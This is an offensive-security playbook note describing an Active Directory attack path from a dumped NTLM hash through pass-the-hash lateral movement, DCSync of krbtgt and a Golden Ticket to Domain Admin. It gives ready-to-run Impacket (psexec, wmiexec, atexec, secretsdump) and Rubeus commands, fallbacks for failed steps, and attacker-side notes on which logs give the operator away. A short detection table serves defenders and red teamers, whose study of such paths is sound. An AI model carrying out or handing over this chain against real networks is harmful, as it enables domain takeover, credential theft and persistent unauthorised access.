---
title: "Attack Path: Pass-the-Hash (dumped NT hash) → lateral to a Tier-0 box → DCSync → Domain Admin"
type: note
created: 2026-09-06
updated: 2026-09-06
tags: [attack-path, active-directory, pass-the-hash, lateral-movement, privilege-escalation]
---

# Attack Path: Pass-the-Hash (dumped NT hash) → Tier-0 box → DCSync → Domain Admin

The **Pass-the-Hash (PtH)** kill-chain: you already hold an **NTLM hash**
(dumped from [[lsass]]/[[sam-database]] on a foothold, or from a
[[kerberoasting|Kerberoast]]/[[as-rep-roasting|AS-REP roast]]). The hash *is*
the credential — no cracking needed. Use it to **move laterally to a Tier-0
box** (a DC, an admin workstation, a box with DCSync rights) where that
account has local admin, then **DCSync** `krbtgt` for durable domain
dominance. This is the "I have a hash, I have a foothold, now I climb" path.
See [[pass-the-hash-and-ticket]] for the PtH/PtT mechanics, [[ntlm]] for why
the hash suffices, and [[smb]] for the exec transport.

## Chain

```
You (a foothold + a dumped NT hash for account A)
  --PtH exec (psexec/wmiexec -hashes) to a host where A is local admin--> shell on a Tier-0 box
  --A has DCSync rights / it's a DC--> DCSync krbtgt
  --Golden Ticket--> Domain Admin
```

## Prerequisites / what signals this path exists

- A **valid NTLM hash** for an account `A` (from LSASS/SAM on a foothold, or
  a roast). Confirm it's *current* (the password hasn't been reset).
- A **host where `A` is local admin** that is **Tier-0 or holds a DCSync
  right** — a DC, a PAW, or a machine with `GetChanges`/`GetChangesAll`. This
  is the target you're climbing to. Map it first:

```powershell
# Where is A local admin? What does A hold?
Get-DomainGroupMember -Identity "Domain Admins"        # is A a DA already?
Get-DomainObjectAcl -Identity <domain> -ResolvedRights # A's DCSync right?
# BloodHound: A -> AdminTo -> <Tier-0 host>; A -> GetChangesAll
```
**Verify:** `A` is local admin on a DC/PAW/DCSync-capable host. If `A` is only
local admin on normal boxes, PtH gets you a *better foothold*, not DA — keep
lateral until you hit a Tier-0 edge.

## Step 1 — Confirm the hash works (a cheap probe)

Before spraying, validate the NT hash against one known host:

```bash
# Password-less SMB check using the hash (lm:nt)
psexec.py -hashes <lm>:<nt> corp.local/A@<target> whoami
# or a lighter probe:
smbclient.py -hashes <lm>:<nt> corp.local/A@<target> -L
```
**Verify:** `whoami` returns `corp.local\A`. If it's an auth failure, the hash
is stale (password reset) — re-dump or use a different account. See
[[pass-the-hash-and-ticket]], [[ntlm]].

### Failure modes & fallbacks
- **Hash stale** — the account's password changed; re-dump from LSASS or use a
  different account.
- **A not local admin on the target** — pick a host where `A` actually has
  admin (the map from the prerequisites), or PtH to a host where `A` is a
  user and privesc locally.
- **SMB signing / NTLM restrictions** — the target may reject NTLM
  ([[smb]]); in that case prefer a Kerberos path
  ([[overpass-the-hash]] for a real TGT from the same hash).

## Step 2 — Lateral to the Tier-0 box

```bash
psexec.py  -hashes <lm>:<nt> corp.local/A@<tier0-host>   # -> SYSTEM/local admin shell
wmiexec.py -hashes <lm>:<nt> corp.local/A@<tier0-host>   # quieter (DCOM)
atexec.py  -hashes <lm>:<nt> corp.local/A@<tier0-host>   # via Task Scheduler (no service)
```
**Verify:** a shell on `<tier0-host>` as `A` (local admin). See [[smb]] for
the exec transports and [[crackmapexec]] for mass PtH across many hosts.

### Failure modes & fallbacks
- **`A` is local admin but not SYSTEM** — fine; privesc locally to SYSTEM if
  you need it for the next step (e.g. reading protected LSASS).
- **The box is a DC** — you're already at the DCSync source; skip to step 3
  directly.

## Step 3 — DCSync krbtgt

If `A` holds a DCSync right (or you're on a DC with a DCSync-capable context),
replicate `krbtgt`:

```bash
secretsdump.py -dc-ip <dc> corp.local/A:<A-password> -just-dc-user krbtgt
# (or, if you only have the hash, use a DCSync tool that accepts hashes —
#  e.g. Impacket -hashes, or dasync)
```
**Verify:** `krbtgt` `aes256-cts-hmac-sha1-96` in the output. See [[dcsync]],
[[krbtgt]].

### Failure modes & fallbacks
- **A has no DCSync right** — you're on a Tier-0 box but `A` can't replicate.
  Either the box is a DC and you can dump the DC's **NTDS.dit** offline
  ([[ntds-dit]]), or you need to privesc `A` further (e.g. to a DA) first.
- **Replication error** — retarget the PDC emulator.

## Step 4 — Domain dominance

```powershell
Rubeus.exe asktgt /user:Administrator /domain:corp.local /sid:S-1-5-21-... \
  /aes256:<krbtgt-aes256> /sids:S-1-5-21-...:512 /ptt
whoami /all   # -> corp.local\administrator + 512
```
See [[golden-silver-tickets]]. **Verify:** `whoami /all` lists
`corp.local\administrator`.

## Detection summary (per step)

| Step | What fires | Your tell |
|------|-----------|-----------|
| 1-2 (PtH) | **4624 Type 3** with **NTLM + Key Length 0** to many hosts | a hash-based (not Kerberos) lateral burst |
| 2 (exec) | 4624 for `A` on the Tier-0 box; `IPC$`/`ADMIN$` connects | admin on a Tier-0 host |
| 3 (DCSync) | **4662** on the domain object (GetChanges+GetChangesAll) | `A` replicating |
| 4 (Golden) | 4768/4624 for Administrator from a non-DC | DA off-DC |

## Cleanup notes
- The **Type-3 NTLM (Key Length 0)** lateral burst is the loudest, most
  durable tell of the whole chain — expect it reviewed.
- The **DCSync 4662** is the second durable artifact.
- If caught, expect `krbtgt` to rotate twice ([[krbtgt]]) and `A`'s password
  reset (which invalidates your hash).

## Related
- [[pass-the-hash-and-ticket]] — the PtH/PtT primitive (steps 1-2)
- [[ntlm]] — why the hash is the credential
- [[smb]] — the exec transport (psexec/wmiexec/atexec)
- [[crackmapexec]] — mass PtH / exec
- [[overpass-the-hash]] — the Kerberos alternative (same hash, real TGT)
- [[dcsync]], [[krbtgt]], [[golden-silver-tickets]] — steps 3-4
- [[ntds-dit]] — the offline-dump fallback if `A` lacks DCSync
- [[ad-persistence]] — durable access once you're DA
